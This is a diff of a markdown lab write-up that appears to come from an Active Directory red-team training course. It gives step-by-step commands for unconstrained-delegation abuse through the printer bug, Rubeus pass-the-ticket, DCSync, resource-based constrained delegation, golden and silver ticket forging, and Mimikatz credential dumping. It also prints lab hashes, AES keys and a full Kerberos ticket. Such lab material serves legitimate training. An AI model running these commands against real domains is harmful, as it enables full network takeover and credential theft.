@@ -562,4 +562,254 @@ certutil -exportpfx -p SecretPass@123 770000002116e9d99c3a4ceaf1000000000021 C:\
 
 And copy it on local machine
 
-copy \\\us-jump3.US.TECHCORP.LOCAL\c$\users\pawadmin\Downloads\pawadmin.pfx C:\AD\Tools\\
+{% code overflow="wrap" %}
+```powershell
+copy \\us-jump3.US.TECHCORP.LOCAL\c$\users\pawadmin\Downloads\pawadmin.pfx C:\AD\Tools\
+```
+{% endcode %}
+
+## Flag 18/19/20/21 - Unconstrained Delegation
+
+First, we need to find out the machines in us.techcorp.local with unconstrained delegation. We can use PowerView  for that. I used BloodHound.
+
+```powershell
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Now use the credentials of webmaster extracted before to check if we have admin rights on this machine
+
+{% code overflow="wrap" %}
+```
+ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+{% endcode %}
+
+On the new spawned process run invishell and use Find-PSRemotingLocalAdminAccess.ps1 to check for the admin rights
+
+```powershell
+Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Now, we will use the printer bug to force us-dc to connect to us-web.&#x20;
+
+{% tabs %}
+{% tab title="Loader" %}
+
+
+Let's first copy Loader.exe to us-web to download and execute Rubeus in the memory and start monitoring for any authentication from us-dc.
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>echo F | xcopy C:\AD\Tools\Loader.exe \\us-web\C$\Users\Public\Loader.exe /Y
+</strong></code></pre>
+
+Now create a tunnel to download the file
+
+{% code overflow="wrap" %}
+```powershell
+netsh interface portproxy add v4tov4 listenport=8080  listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
+```
+{% endcode %}
+
+And use rubeus with the monitor option
+
+{% code overflow="wrap" %}
+```powershell
+C:\Users\Public\Loader.exe -path  http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:US-DC$ /interval:5  /nowrap
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="PS-Remoting" %}
+{% code overflow="wrap" %}
+```powershell
+$usweb1 = New-PSSession us-web
+Copy-Item -ToSession $usweb1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\Public
+Enter-PSSession $usweb1
+cd C:\Users\Public
+.\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Using either of the above methods, once we have Rubeus running in the monitor mode, we can start MS-RPRN.exe to force connect us-dc to us-web and thereby abuse the printer bug:
+
+```
+C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Now use the ticket to gain a session
+
+{% code overflow="wrap" %}
+```
+ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMaPbocsG/tcZialIisEwS7ddByeYtDvo26euMi2wawAJiCYHp9GIZIonlDhnjLEo+txhXSEC4xOIF9g8ceh3lExlbofN+FMFUZShZAkozLvQm4KVwQeEkhip4qPVyXU4GZk3gAuPUvxbhlgrvj0okeU+CtxCq21e6gvNt9xn99L7072OjCNowRMBW/zGmyEFiC/seUVcH7iYdv1EKGrb94EM9XYhB3sQiDr+HCV1YVvR6qn3HBev/q9qMQ4jrBFr4LGid0CbQxkAjNpVgOD/1PiMznpqQGC5I3RrxMfuEogyGySftYTogbMtNILMRe3Ervk+pX8f6Z6L5SF2gGBdYUh+Fr7+rWWRC1NnCf9Bd9EAWigAQZD5KBpQ5vSz+tBtNKKzsI0J1NrFzUKFrS6EFWZsoNLUwjKOiDHVmnJ8DQMhij7ImNfOFPsKUMeXap15usc8rorz1pcORkzZZsYe02H9pRA3sCvshwkL2l+VRkaG8MZDOAsQky28nyhhMDldSpyDbqGVs7Ql138newyUQuzicejFSC+pFiY7mmsb/wPznYI7ZcD09kYB0IeB7OcL/5JlYqXYP8j4Id72CRhtaZCPe8BKCVeI09THMLYKkg+WPPNycLPC0dpSckU+f9USuvxZcn/ez6Oef2nl4GW2bawgn126P5IJVrf+m3wXavm8WMRtk1hIecmJ2N2G/+6WcphjZs/vuKt7y6uITnvsUF++u41oCJO8VogvWRm8HvSx3dmYB+0I12OXefLg3SxtmjTjinGJSJ3chDbCaugC95vlpncn51CcHzRA7+BhaD3awZUex4fRaWMYarvF2xGKYzOO9u31I9lAmFmfgl6ftCDr5qDYFZUNoEqQgwzoWVqyjyLSBSaALbVHQVpOPE06zIt/DS4op+XTRJau9wXUxXnz0ZiMIMXqRmLbbektzeZVluf8hyGU9H2CrSui4XhpPuJyRN/8USSYILsZmOmd0Mz1FhGk8xrJLZdc3UN0O4ucsO3EPnjgrtAetrEzDsFdc72QUqeHN45k9LksEqHFjG8YAWeQFJOSPPEGj9nWWDqhEOKyo2R3isD0Dv64H7WVAp2sOKDVCLoYgxd80QCU7zrtF4g8ZJVKtI98dJKigFc1C0N2InUkKNSJ2ygP8JTZm0fT99XFpt7MZxI3Lez6Pet1Xkd/AvFmNkkdDvdRHEkVI+Nj5ySnqREnF++lVasB/oZEYfYp4lAvWfEqcrxzc2SAm22wKKp4T3ThNjgYI1piIb3HZY8g/2DMglSk+DPImwMlXsIc0+K/MtPfgPqFzzGq5y1yecJXZ1431B0uiPt+O7LwvNQQXcAdNsw2G3YpT5391h5FIyfu98pct3MXPzOCAk0SbNCy5npFtPAORUXRAi8C9w9ZZOgYq2esm0K89SGif0siiA95QjbEHKf7+dNfK4YnOx2MNRpVtwChiA5nsW/+BR86+8AR6LJqjgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDtjM6US9v0RLKjK0PbAN+1gUDjzBx/eIUcXhg6cCCXXKETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDI0MDQyOTA0MTA0NlqmERgPMjAyNDA0MjkxNDEwMDhapxEYDzIwMjQwNTA2MDQxMDA4WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
+```
+{% endcode %}
+
+And run a DCSync attack against the DC
+
+{% code overflow="wrap" %}
+```
+ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:us\krbtgt" "exit"
+```
+{% endcode %}
+
+krbtgt aes: _5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5_\
+RC4:  _b0975ae49f441adc6b024ad238935af5_
+
+## Flag N/A - Constrained Delegation
+
+Enumerate the objects in our current domain that have constrained delegation enabled with the help of the Active Directory module from InvisiShell:
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Recall l that we extracted credentials of appsvc from us-jump, let’s use the AES256 keys for appsvc to impersonate the domain administrator - administrator and access us-mssql using those privileges. Note that we request an alternate ticket for HTTP service to be able to use WinRM.
+
+## Flag 22 to 29 - Write/GenericWrite permission over Computer Object
+
+Extract credential from us-mgmt that we already own with safetykatz
+
+{% code overflow="wrap" %}
+```powershell
+$usmgmt1 = New-PSSession us-mgmt
+Copy-Item -ToSession $usmgmt1 -Path C:\AD\Tools\SafetyKatz.exe -Destination C:\Users\Public
+Enter-PSSession $usmgmt1
+cd C:\Users\Public
+.\Safetykatz.exe -args sekurlsa::ekeys exit
+```
+{% endcode %}
+
+mgmtadmin aes: 32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f\
+RC4: e53153fc2dc8d4c5a5839e46220717e5
+
+Now using powerview lt's see if he has some interesting ACLs
+
+{% code overflow="wrap" %}
+```
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+We are using our student VM computer object and not the studentuserx as SPN is required for RBCD
+
+Start a process with privileges of mgtmadmin. Use ArgSplit.bat on the student VM to encode “asktgt”&#x20;
+
+{% code overflow="wrap" %}
+```powershell
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:mgmtadmin /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f  /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+{% endcode %}
+
+Run Invishell and import AD-Module. Now set RBCD to the student vm:
+
+{% code overflow="wrap" %}
+```powershell
+Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount student64$ -Verbose
+```
+{% endcode %}
+
+Now we need the aes of the student vm. Use SafetyKatz
+
+{% hint style="info" %}
+Use the one with SID = S-1-5-18
+{% endhint %}
+
+{% code overflow="wrap" %}
+```powershell
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
+```
+{% endcode %}
+
+student64$ aes: 6f7e997ae3f3fc5265ce2961a829227873908e821c30b47fbf0004bc57f21825
+
+now use rubeus with s4u to create a ticket and open a session
+
+{% code overflow="wrap" %}
+```powershell
+ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:student64$  /aes256:6f7e997ae3f3fc5265ce2961a829227873908e821c30b47fbf0004bc57f21825 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Now copy the NetLoader on the target and use it to launch SafetyKatz and extract credetials
+
+{% code overflow="wrap" %}
+```powershell
+xcopy C:\AD\Tools\Loader.exe \us-helpdesk\C$\Users\Public\Loader.exe /Y
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args %Pwn% "exit"
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+helpdeskadmin aes: _f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534_
+
+Now create and import a ticket to look if this user has admin privilege on some machine
+
+```powershell
+Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
+```
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+## Flag 29 - Golden Ticket
+
+Using the krbtgt aes previously obtained to craft a silver ticket
+
+{% code overflow="wrap" %}
+```powershell
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args golden /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /printcmd
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Now use the generated command to print a golden ticket nad import it
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+Now use PS-Remoting to dump all the domain secrets
+
+```
+$sess = New-PSSession us-dc.us.techcorp.local
+Enter-PSSession -Session $sess
+```
+
+Now bypass amsi and import Invoke-Mimi
+
+<pre data-overflow="wrap"><code>Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
+<strong>Enter-PSSession -Session $sess
+</strong>Invoke-Mimi -Command '"lsadump::lsa /patch"'
+</code></pre>
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+us-dc$ rc4:  _f4492105cb24a843356945e45402073e_
+
+## Flag 30 - Silver Ticket
+
+Create a silver ticket for the dc machine using the rc4 previously obtained
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args silver /service:http/us-dc.us.techcorp.local /rc4:f4492105cb24a843356945e45402073e /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /domain:us.techcorp.local /ptt
+```
+{% endcode %}
+
